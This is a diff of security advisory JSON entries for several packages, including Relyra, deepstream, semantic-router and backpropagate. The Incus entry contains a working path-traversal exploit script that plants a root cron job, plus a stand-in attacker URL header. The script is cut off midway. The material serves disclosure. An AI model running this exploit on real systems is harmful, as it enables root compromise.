+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/startreedata/mcp-pinot/security-advisories/GHSA-73cv-556c-w3g6",
+    "source_code_location": "https://github.com/startreedata/mcp-pinot",
+    "identifiers": [
+      {
+        "value": "GHSA-73cv-556c-w3g6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-49257",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/startreedata/mcp-pinot/security/advisories/GHSA-73cv-556c-w3g6",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-49257",
+      "https://github.com/startreedata/mcp-pinot/issues/90",
+      "https://github.com/startreedata/mcp-pinot/pull/95",
+      "https://github.com/startreedata/mcp-pinot/commit/1c7d3f9cd384854bf72c127d230bdb32299475ad",
+      "https://github.com/advisories/GHSA-73cv-556c-w3g6"
+    ],
+    "published_at": "2026-06-26T21:05:43Z",
+    "updated_at": "2026-06-26T21:05:46Z",
+    "github_reviewed_at": "2026-06-26T21:05:43Z",
+    "nvd_published_at": "2026-06-18T21:16:29Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "mcp-pinot-server"
+        },
+        "vulnerable_version_range": "<= 3.0.1",
+        "first_patched_version": "3.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "score": 10.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-306",
+        "name": "Missing Authentication for Critical Function"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "raysabee",
+          "id": 38766854,
+          "node_id": "MDQ6VXNlcjM4NzY2ODU0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/38766854?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/raysabee",
+          "html_url": "https://github.com/raysabee",
+          "followers_url": "https://api.github.com/users/raysabee/followers",
+          "following_url": "https://api.github.com/users/raysabee/following{/other_user}",
+          "gists_url": "https://api.github.com/users/raysabee/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/raysabee/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/raysabee/subscriptions",
+          "organizations_url": "https://api.github.com/users/raysabee/orgs",
+          "repos_url": "https://api.github.com/users/raysabee/repos",
+          "events_url": "https://api.github.com/users/raysabee/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/raysabee/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "PeledTomer1",
+          "id": 114926055,
+          "node_id": "U_kgDOBtmh5w",
+          "avatar_url": "https://avatars.githubusercontent.com/u/114926055?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/PeledTomer1",
+          "html_url": "https://github.com/PeledTomer1",
+          "followers_url": "https://api.github.com/users/PeledTomer1/followers",
+          "following_url": "https://api.github.com/users/PeledTomer1/following{/other_user}",
+          "gists_url": "https://api.github.com/users/PeledTomer1/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/PeledTomer1/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/PeledTomer1/subscriptions",
+          "organizations_url": "https://api.github.com/users/PeledTomer1/orgs",
+          "repos_url": "https://api.github.com/users/PeledTomer1/repos",
+          "events_url": "https://api.github.com/users/PeledTomer1/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/PeledTomer1/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "score": 10.0
+    },
+    "epss": {
+      "percentage": 0.00498,
+      "percentile": 0.38706
+    }
+  },
+  {
+    "ghsa_id": "GHSA-jv46-xfwm-36j7",
+    "cve_id": "CVE-2026-49454",
+    "url": "https://api.github.com/advisories/GHSA-jv46-xfwm-36j7",
+    "html_url": "https://github.com/advisories/GHSA-jv46-xfwm-36j7",
+    "summary": "Relyra SAML SignatureValue not cryptographically verified -> authentication bypass",
+    "description": "## Summary\n\nRelyra `1.0.0` and `1.1.0` accept forged SAML signatures because `SignatureValue` was not cryptographically verified before the library returned a successful authentication result.\n\n## Details\n\nIn `1.0.0` and `1.1.0`, the XMLDSig trust boundary was incomplete. `:public_key.verify` over the exclusive-C14N canonicalized `SignedInfo` was not performed against the configured IdP certificate's public key, `DigestValue` was not recomputed over the canonicalized referenced element, and `canonicalize/2` remained an unused passthrough in the signature-verification path. The result was a structure-only acceptance path where document shape and trust-source rejection could succeed without proving the signature bytes.\n\n## Impact\n\nA forged `SignatureValue` carrying an attacker-controlled `NameID` can be accepted as `{:ok}`. Any relying-party application using Relyra `1.0.0` or `1.1.0` can be logged into as an arbitrary user if it trusts the affected response path.\n\n## Patches\n\nRelyra `1.2.0` closes the gap with real exclusive-C14N canonicalization, `:public_key.verify` against the configured IdP certificate's public key, and a constant-time `DigestValue` recompute/compare bound to the exact consumed node on both `verify/4` and `verify_metadata_root/4`.\n\n## Workarounds\n\nThere is no safe configuration of `1.0.0` or `1.1.0`. Upgrade to `1.2.0` or later.\n\n## Resources\n\n- Fix commit `2e45689` (wire real XMLDSig crypto into the candidate arm)\n- Fix commit `8910200` (close metadata trust bypass, pin over DER)\n- Regression proof: `test/security/xml/adversarial_crypto_test.exs`, `test/relyra/metadata/auto_refresh_test.exs`, `test/security/ci_gate_integrity_test.exs`",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/szTheory/relyra/security-advisories/GHSA-jv46-xfwm-36j7",
+    "source_code_location": "https://github.com/szTheory/relyra",
+    "identifiers": [
+      {
+        "value": "GHSA-jv46-xfwm-36j7",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-49454",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/szTheory/relyra/security/advisories/GHSA-jv46-xfwm-36j7",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-49454",
+      "https://github.com/szTheory/relyra/commit/2e456897af3158c175bb490ce7fc51d6241c8922",
+      "https://github.com/szTheory/relyra/commit/8910200",
+      "https://github.com/advisories/GHSA-jv46-xfwm-36j7"
+    ],
+    "published_at": "2026-06-26T21:05:13Z",
+    "updated_at": "2026-06-26T21:05:15Z",
+    "github_reviewed_at": "2026-06-26T21:05:13Z",
+    "nvd_published_at": "2026-06-18T21:16:29Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "erlang",
+          "name": "relyra"
+        },
+        "vulnerable_version_range": ">= 1.0.0, < 1.2.0",
+        "first_patched_version": "1.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
+      {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 9.1
+    },
+    "epss": {
+      "percentage": 0.00135,
+      "percentile": 0.03254
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9v98-6g37-x9g6",
+    "cve_id": "CVE-2026-49252",
+    "url": "https://api.github.com/advisories/GHSA-9v98-6g37-x9g6",
+    "html_url": "https://github.com/advisories/GHSA-9v98-6g37-x9g6",
+    "summary": "deepstream is vulnerable to prototype pollution",
+    "description": "### Impact\nPrototype pollution in deepstream server v <=10.0.4. Potential privilege escalation from any authenticated user with write permission to any record.\n\n### Patches\nYes, upgrade to v10.0.5\n\n### Workarounds\nFilter out all messages containing the path `__proto__`, `constructor`, `prototype`, **before they reach the server's message pipeline**",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/deepstreamIO/deepstream.io/security-advisories/GHSA-9v98-6g37-x9g6",
+    "source_code_location": "https://github.com/deepstreamIO/deepstream.io",
+    "identifiers": [
+      {
+        "value": "GHSA-9v98-6g37-x9g6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-49252",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/deepstreamIO/deepstream.io/security/advisories/GHSA-9v98-6g37-x9g6",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-49252",
+      "https://github.com/deepstreamIO/deepstream.io/commit/54b8e2958a98df444b5b5d9a66e22872afd84e44",
+      "https://github.com/advisories/GHSA-9v98-6g37-x9g6"
+    ],
+    "published_at": "2026-06-26T21:03:59Z",
+    "updated_at": "2026-06-26T21:04:00Z",
+    "github_reviewed_at": "2026-06-26T21:03:59Z",
+    "nvd_published_at": "2026-06-18T21:16:29Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@deepstream/server"
+        },
+        "vulnerable_version_range": "< 10.0.5",
+        "first_patched_version": "10.0.5",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-1321",
+        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.0027,
+      "percentile": 0.18543
+    }
+  },
+  {
+    "ghsa_id": "GHSA-98x5-vq43-vc5p",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-98x5-vq43-vc5p",
+    "html_url": "https://github.com/advisories/GHSA-98x5-vq43-vc5p",
+    "summary": "semantic-router exposed to compromised litellm wheel (CVE-2026-42208) via unbounded transitive pin",
+    "description": "## Impact\nsemantic-router versions 0.1.8 through 0.1.14 declare `litellm>=1.61.3` with no upper bound. During the window in which `litellm==1.82.8` was the latest release on PyPI, a fresh install of any affected semantic-router version could resolve to that compromised wheel.\n\nThe malicious `litellm==1.82.8` wheel ships a `litellm_init.pth` file that executes on Python interpreter startup — no import required. It collects and exfiltrates:\n- Process environment variables\n- AWS / GCP / Azure credentials\n- SSH keys, Kubernetes configs, shell history\n- Database credentials and CI/CD secrets\n- Cryptocurrency wallets\n\nStage-two payload encrypts the collected data (AES-256 + embedded RSA pubkey) and POSTs it to `https://models.litellm.cloud/`.\n\nSee upstream: [BerriAI/litellm#24512](https://github.com/BerriAI/litellm/issues/24512) and [CVE-2026-42208](https://www.cve.org/CVERecord?id=CVE-2026-42208).\n\n## Patches\nFixed in **semantic-router 0.1.15**, which raises the floor to `litellm>=1.83.7`.\n\n## Workarounds\nIf developers cannot upgrade immediately:\n- Pin `litellm>=1.83.7,!=1.82.8` explicitly in their own project.\n- Audit `site-packages/` for `litellm_init.pth` and delete if present.\n- Rotate any credentials reachable from environments where an affected install ran.\n\n## Credit\nUpstream report and triage by the litellm maintainers — see issue [#24512](https://github.com/BerriAI/litellm/issues/24512).\n\nOne caveat before publishing\n\nCVE-2026-42208 specifically names 1.82.8. Pip's resolver picks \"latest matching\", so the real affected blast radius for semantic-router is users who ran pip install during the window that 1.82.8 was on PyPI — not everyone who ever installed 0.1.8–0.1.14. The advisory is still correct (an affected install could have pulled the bad wheel), but consider whether a Severity: Critical / Exploitability: time-bounded note would help downstream readers understand the exposure model.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/aurelio-labs/semantic-router/security-advisories/GHSA-98x5-vq43-vc5p",
+    "source_code_location": "https://github.com/aurelio-labs/semantic-router",
+    "identifiers": [
+      {
+        "value": "GHSA-98x5-vq43-vc5p",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/aurelio-labs/semantic-router/security/advisories/GHSA-98x5-vq43-vc5p",
+      "https://github.com/advisories/GHSA-98x5-vq43-vc5p"
+    ],
+    "published_at": "2026-06-26T20:51:20Z",
+    "updated_at": "2026-06-26T20:51:21Z",
+    "github_reviewed_at": "2026-06-26T20:51:20Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "semantic-router"
+        },
+        "vulnerable_version_range": ">= 0.1.8, < 0.1.15",
+        "first_patched_version": "0.1.15",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-506",
+        "name": "Embedded Malicious Code"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "jamescalam",
+          "id": 35938317,
+          "node_id": "MDQ6VXNlcjM1OTM4MzE3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/35938317?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jamescalam",
+          "html_url": "https://github.com/jamescalam",
+          "followers_url": "https://api.github.com/users/jamescalam/followers",
+          "following_url": "https://api.github.com/users/jamescalam/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jamescalam/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jamescalam/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jamescalam/subscriptions",
+          "organizations_url": "https://api.github.com/users/jamescalam/orgs",
+          "repos_url": "https://api.github.com/users/jamescalam/repos",
+          "events_url": "https://api.github.com/users/jamescalam/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jamescalam/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f65r-h4g3-3h9h",
+    "cve_id": "CVE-2026-48797",
+    "url": "https://api.github.com/advisories/GHSA-f65r-h4g3-3h9h",
+    "html_url": "https://github.com/advisories/GHSA-f65r-h4g3-3h9h",
+    "summary": "Backpropagate: backprop ui --auth and backprop ui --share do not enforce authentication",
+    "description": "## Summary\n\nIn `backpropagate >= 1.1.0`, the optional Reflex web UI (`pip install backpropagate[ui]`, launched via `backprop ui`) exposes a training control plane: dataset upload, model load, training start/stop, multi-run orchestration, GGUF export, and HuggingFace Hub push.\n\nThe CLI accepts two operator-facing flags intended as security controls:\n\n- `--auth user:pass` — documented as \"require HTTP Basic authentication on every request to the UI.\"\n- `--share` — documented as \"expose the UI on a public address; requires `--auth`.\"\n\nWhen `--auth user:pass` is passed, the CLI prints `Auth: enabled (user: <username>)` to confirm to the operator that authentication is active, then exports `BACKPROPAGATE_UI_AUTH=user:pass` to the subprocess that launches the Reflex backend.\n\n**The Reflex backend (`backpropagate/ui_app/**`) never reads `BACKPROPAGATE_UI_AUTH`.** No authentication middleware is registered. No request-level guard runs. No WebSocket upgrade guard runs. Any client that reaches the bound port — local or remote, depending on whether `--share` is used — has full UI access.\n\nAn inline comment at `backpropagate/cli.py:1217-1218` in the v1.1.0 source documents the gap: *\"For Phase 1 the variable is exported but Reflex doesn't read it yet.\"* This comment was internal-facing; the user-facing documentation (README, CHANGELOG, SHIP_GATE) advertised the contract as enforced.\n\nThis advisory is filed primarily because the runtime contradicted an operator-facing security claim. Code-only bugs of comparable shape (auth check missing entirely from a path) would already warrant disclosure; the additional false-promise dimension raises the severity.\n\n## Impact\n\nAn attacker who reaches the bound port can:\n\n- **Read uploaded datasets** rendered in the UI preview, including content of any JSONL/CSV/TXT file the legitimate operator has uploaded for fine-tuning.\n- **Trigger arbitrary training runs** against any base model the operator has installed locally or that can be downloaded from HuggingFace.\n- **Trigger HuggingFace Hub pushes** to repositories named via the UI input (subject to the operator's local HF token's scope — typically all repos owned by the operator).\n- **Cause disk-fill DoS** via the `rx.upload` endpoint (no size cap, no extension filter, no per-session count cap in v1.1.0 / v1.1.1).\n- **Read model paths** (`source_model_path`, `dataset_path`, `model`, `uploaded_path`) which are user-supplied and bypass the `safe_path()` helper that lives in `backpropagate/ui_security.py` (path validation is dead code on the Reflex surface in v1.1.0 / v1.1.1).\n\nThe combination of unauthenticated training control, HF push target spoofing, and path-input traversal makes the affected endpoint suitable for both data exfiltration (reading uploaded training data) and supply-chain attacks (pushing tampered model weights to the operator's HF account).\n\nThe local-only default (no `--share`) reduces exposure to a host-local attacker. The `--share` flag is documented as a \"public URL\" feature; operators who used `--share --auth user:pass` had no warning that the auth half was inert.\n\n## Patches\n\nFixed in **v1.2.0** (released 2026-05-23). The patch implements real ASGI middleware via `rx.App(api_transformer=basic_auth_transformer)` that gates HTTP routes AND the `/_event` WebSocket upgrade. Four modes (`no_auth_local_only` / `token_auto` / `explicit_creds` / `production`), HMAC-signed cookie validated PRE-`websocket.accept()`, Host + Origin allowlists. The middleware ships alongside a 4-layer defense in depth at the cli.py / ui_app/app.py / rxconfig.py / env-strip surfaces so direct `python -m reflex run` invocations (bypassing the CLI guard) also enforce authentication.\n\nUpgrade with:\n\n- pip: `pip install --upgrade backpropagate`\n- npm: `npm install -g @mcptoolshop/backpropagate@latest`\n\nFull release notes: https://github.com/mcp-tool-shop-org/backpropagate/blob/main/CHANGELOG.md#120---2026-05-23\n\n## Workarounds\n\nIf users cannot upgrade immediately:\n\n1. **Do not pass `--auth` or `--share` to `backprop ui`.** Run the UI with no flags (`backprop ui`); it will bind to `localhost` and accept any client that can reach `127.0.0.1`.\n2. **For remote access, use SSH port-forwarding** instead of `--share`:\n   ```\n   # On the client:\n   ssh -L 7860:localhost:7860 <training-host>\n   # On the server:\n   backprop ui            # no --share\n   # Then open http://localhost:7860 in your local browser.\n   ```\n   SSH provides the authentication layer the Reflex UI did not.\n3. **Audit existing deployments.** If any host running `backpropagate >= 1.1.0` has previously been launched with `--share`, treat any uploaded training data, model paths, or HF push targets visible in that UI session as potentially exposed. Re-issue HF tokens that have been in use during such sessions.\n\n**Binary distribution gap.** Standalone binaries (Windows .exe / macOS .app via PyInstaller) failed to build for v1.2.0 and will land in a follow-up patch release. In the interim, users who relied on the v1.1.x binary distribution should install the patched version via `pip install backpropagate==1.2.0` to receive the auth-bypass fix. The v1.2.0 PyPI package and `@mcptoolshop/backpropagate@1.2.0` npm package both carry the patched code.\n\n## Credit\n\nDiscovered by the dogfood-swarm Stage A audit on 2026-05-22 (finding ID `FRONTEND-A-001`, classified CRITICAL). The audit also surfaced contradicting documentation in CHANGELOG / SHIP_GATE / README; those were corrected in v1.2.0 alongside the runtime fix.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/mcp-tool-shop-org/backpropagate/security-advisories/GHSA-f65r-h4g3-3h9h",
+    "source_code_location": "https://github.com/mcp-tool-shop-org/backpropagate",
+    "identifiers": [
+      {
+        "value": "GHSA-f65r-h4g3-3h9h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48797",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/mcp-tool-shop-org/backpropagate/security/advisories/GHSA-f65r-h4g3-3h9h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-48797",
+      "https://github.com/mcp-tool-shop-org/backpropagate/releases/tag/v1.2.0",
+      "https://github.com/advisories/GHSA-f65r-h4g3-3h9h"
+    ],
+    "published_at": "2026-06-26T20:34:29Z",
+    "updated_at": "2026-06-26T20:34:30Z",
+    "github_reviewed_at": "2026-06-26T20:34:29Z",
+    "nvd_published_at": "2026-06-17T13:20:43Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "backpropagate"
+        },
+        "vulnerable_version_range": ">= 1.1.0, < 1.2.0",
+        "first_patched_version": "1.2.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@mcptoolshop/backpropagate"
+        },
+        "vulnerable_version_range": ">= 1.1.0, < 1.2.0",
+        "first_patched_version": "1.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 9.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-358",
+        "name": "Improperly Implemented Security Check for Standard"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
+      {
+        "cwe_id": "CWE-1295",
+        "name": "Debug Messages Revealing Unnecessary Information"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00324,
+      "percentile": 0.24049
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f6m5-xw2g-xc4x",
+    "cve_id": "CVE-2026-48769",
+    "url": "https://api.github.com/advisories/GHSA-f6m5-xw2g-xc4x",
+    "html_url": "https://github.com/advisories/GHSA-f6m5-xw2g-xc4x",
+    "summary": "Incus has an arbitrary file write on its client due to trusted image hash",
+    "description": "### Summary\n\nAn arbitrary file write exists in the Incus client when a malicious image server returns a crafted `Incus-Image-Hash` header. This can lead to arbitrary command execution as root on the server.\n\n\n### Details\n\n- `cmd/incusd/images.go:611-684` handles `source.type=url` by HEADing the user-supplied URL, reading `Incus-Image-Hash` and `Incus-Image-URL`, and passing them to `imageDownload()` as `Alias`  and `Server`.\n- `cmd/incusd/daemon_images.go:91-92` defaults `fp` to the caller-controlled alias string.\n- `cmd/incusd/daemon_images.go:333-335` builds `destName := filepath.Join(destDir, fp)`.\n- `cmd/incusd/daemon_images.go:469-523` enters the `direct` protocol branch, opens `destName` with `os.Create()`, and copies the HTTP response into that file.\n- `cmd/incusd/daemon_images.go:528-532` validates the SHA-256 only after the file has already been created and populated.\n- `cmd/incusd/daemon_images.go:337-344` cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.\n\nA malicious image server returning something along the following will cause the arbitrary file write.\n\n```\nIncus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce\nIncus-Image-URL: http://attacker/payload\n```\n\n\n### PoC\n\nThe script below creates a malicious image server and requests an Incus server to fetch the image. File write occurs when the image is unpacked.\n\nThe following script was generated by an LLM.\n\n```\n#!/usr/bin/env python3\n\"\"\"Direct image URL hash path traversal to transient host cron write.\n\nFor `source.type=url`, Incus first HEADs an attacker-controlled URL and trusts the `Incus-Image-Hash` header as the expected fingerprint. The direct download path then creates `/var/lib/incus/images/<hash>` before validating that the hash is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the image directory.\n\nDefault mode is dry-run. With --execute-trigger this script starts a tiny HTTP server, returns a traversal hash pointing at cron, streams the cron payload, and keeps the response open so the daemon-side cleanup does not immediately remove the file.\n\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport http.client\nimport json\nimport shlex\nimport socket\nimport ssl\nimport sys\nimport threading\nimport time\nimport urllib.parse\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\nfrom typing import Any\n\n\nDEFAULT_SOCKET = \"/var/lib/incus/unix.socket\"\nDEFAULT_TRAVERSAL = \"../../../../etc/cron.d/incus-direct-image-url-rce\"\n\n\nclass UnixHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, socket_path: str, timeout: int = 120):\n        super().__init__(\"incus\", timeout=timeout)\n        self.socket_path = socket_path\n\n    def connect(self) -> None:\n        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        sock.settimeout(self.timeout)\n        sock.connect(self.socket_path)\n        self.sock = sock\n\n\nclass RCEHTTPServer(ThreadingHTTPServer):\n    hash_path: str\n    advertise_url: str\n    payload: bytes\n    hold_seconds: int\n    payload_requested: threading.Event\n\n\nclass DirectImageHandler(BaseHTTPRequestHandler):\n    protocol_version = \"HTTP/1.1\"\n    server_version = \"direct-image-rce/1.0\"\n\n    def log_message(self, fmt: str, *args: Any) -> None:\n        print(f\"[http] {self.address_string()} - {fmt % args}\", flush=True)\n\n    def do_HEAD(self) -> None:\n        if self.path != \"/stage\":\n            self.send_error(404)\n            return\n\n        srv = self.server\n        assert isinstance(srv, RCEHTTPServer)\n        self.send_response(200)\n        self.send_header(\"Incus-Image-Hash\", srv.hash_path)\n        self.send_header(\"Incus-Image-URL\", srv.advertise_url.rstrip(\"/\") + \"/payload\")\n        self.send_header(\"Connection\", \"close\")\n        self.end_headers()\n\n    def do_GET(self) -> None:\n        if self.path != \"/payload\":\n            self.send_error(404)\n            return\n\n        srv = self.server\n        assert isinstance(srv, RCEHTTPServer)\n        srv.payload_requested.set()\n\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/octet-stream\")\n        self.send_header(\"Cache-Control\", \"no-store\")\n        self.end_headers()\n        self.wfile.write(srv.payload)\n        self.wfile.flush()\n        print(f\"[*] payload bytes written to daemon response; holding for {srv.hold_seconds}s\", flush=True)\n        time.sleep(srv.hold_seconds)\n        self.close_connection = True\n\n\ndef quote(value: str) -> str:\n    return urllib.parse.quote(value, safe=\"\")\n\n\ndef tls_context(args: argparse.Namespace) -> ssl.SSLContext:\n    if args.insecure:\n        ctx = ssl._create_unverified_context()\n    else:\n        ctx = ssl.create_default_context(cafile=args.cacert)\n\n    if args.cert:\n        ctx.load_cert_chain(args.cert, args.key)\n\n    return ctx\n\n\ndef connection(args: argparse.Namespace) -> http.client.HTTPConnection:\n    if args.url:\n        parsed = urllib.parse.urlparse(args.url)\n        if parsed.scheme != \"https\":\n            raise ValueError(\"--url must use https\")\n\n        return http.client.HTTPSConnection(\n            parsed.hostname,\n            parsed.port or 8443,\n            timeout=args.timeout,\n            context=tls_context(args),\n        )\n\n    return UnixHTTPConnection(args.socket, timeout=args.timeout)\n\n\ndef request_json(\n    args: argparse.Namespace,\n    method: str,\n    path: str,\n    obj: dict[str, Any] | None,\n    allow_error: bool = False,\n) -> tuple[int, dict[str, Any]]:\n    body = None if obj is None else json.dumps(obj).encode(\"utf-8\")\n    headers = {\"Host\": \"incus\"}\n    if body is not None:\n        headers[\"Content-Type\"] = \"application/json\"\n\n    conn = connection(args)\n    conn.request(method, path, body=body, headers=headers)\n    resp = conn.getresponse()\n    raw = resp.read()\n    conn.close()\n\n    try:\n        data = json.loads(raw) if raw else {}\n    except json.JSONDecodeError:\n        data = {\"raw\": raw.decode(\"utf-8\", \"replace\")}\n\n    if not allow_error and (resp.status >= 400 or data.get(\"type\") == \"error\"):\n        raise RuntimeError(f\"{method} {path} failed with HTTP {resp.status}: {data}\")\n\n    return resp.status, data\n\n\ndef images_path(project: str) -> str:\n    return \"/1.0/images?project=\" + quote(project)\n\n\ndef cron_payload(command: str) -> bytes:\n    return f\"* * * * * root /bin/sh -c {shlex.quote(command)}\\n\".encode(\"utf-8\")\n\n\ndef image_url_body(project_url: str, public: bool) -> dict[str, Any]:\n    return {\n        \"source\": {\n            \"type\": \"url\",\n            \"url\": project_url.rstrip(\"/\") + \"/stage\",\n        },\n        \"public\": public,\n    }\n\n\ndef start_server(args: argparse.Namespace, payload: bytes) -> RCEHTTPServer:\n    server = RCEHTTPServer((args.listen_host, args.listen_port), DirectImageHandler)\n    server.hash_path = args.hash_path\n    server.advertise_url = args.advertise_url\n    server.payload = payload\n    server.hold_seconds = args.hold_seconds\n    server.payload_requested = threading.Event()\n\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\n    thread.start()\n    return server\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"Incus direct image URL hash traversal cron RCE PoC\")\n    parser.add_argument(\"--socket\", default=DEFAULT_SOCKET, help=\"Incus Unix socket\")\n    parser.add_argument(\"--url\", help=\"remote Incus URL, for example https://host.ctf:8443\")\n    parser.add_argument(\"--cert\", help=\"client certificate for remote Incus\")\n    parser.add_argument(\"--key\", help=\"client private key for remote Incus\")\n    parser.add_argument(\"--cacert\", help=\"CA certificate for remote Incus\")\n    parser.add_argument(\"--insecure\", action=\"store_true\", help=\"disable TLS verification\")\n    parser.add_argument(\"--timeout\", type=int, default=120, help=\"Incus request timeout\")\n    parser.add_argument(\"--project\", default=\"default\", help=\"project used for image import\")\n    parser.add_argument(\"--public\", action=\"store_true\", help=\"mark imported image public\")\n    parser.add_argument(\"--listen-host\", default=\"0.0.0.0\", help=\"HTTP listen address\")\n    parser.add_argument(\"--listen-port\", type=int, default=8088, help=\"HTTP listen port\")\n    parser.add_argument(\"--advertise-url\", default=\"http://127.0.0.1:8088\", help=\"URL reachable by the Incus daemon\")\n    parser.add_argument(\"--hash-path\", default=DEFAULT_TRAVERSAL, help=\"value returned in Incus-Image-Hash\")\n    parser.add_argument(\"--hold-seconds\", type=int, default=90, help=\"keep payload response open for this many seconds\")\n    